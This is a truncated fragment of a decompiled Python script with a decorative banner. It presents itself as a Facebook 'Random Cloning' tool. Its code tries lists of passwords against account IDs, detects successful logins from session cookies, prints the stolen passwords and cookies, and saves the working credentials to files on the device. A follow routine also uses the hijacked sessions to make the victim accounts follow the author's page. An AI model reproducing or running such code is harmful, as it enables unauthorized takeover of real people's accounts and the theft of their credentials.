# Decompile by Marshal (Tools By  𝐀𝐁𝐃𝐔𝐋𝐋𝐀𝐇 𝐑𝐀𝐉𝐔)
# Time Succes decompile : 2023-11-21 12:58:41.532325
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://https://www.facebook.com/abdullahraju404', {
...
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░░╚═════╝░                                                        
 ...
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝐀𝐁𝐃𝐔𝐋𝐋𝐀𝐇 𝐑𝐀𝐉𝐔     \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐀𝐁𝐃𝐔𝐋𝐋𝐀𝐇 𝐑𝐀𝐉𝐔     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mrajuhasan0        \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning      \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35m RJ            \033[1;93m|
 ...
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m 𝐀𝐁𝐃𝐔𝐋𝐋𝐀𝐇 𝐑𝐀𝐉𝐔            \033[1;93m|
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45m𝐑𝐀𝐉𝐔-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝐑𝐀𝐉𝐔-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[𝐑𝐀𝐉𝐔-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝐑𝐀𝐉𝐔-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}𝐀𝐁𝐃𝐔𝐋𝐋𝐀𝐇 𝐑𝐀𝐉𝐔{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
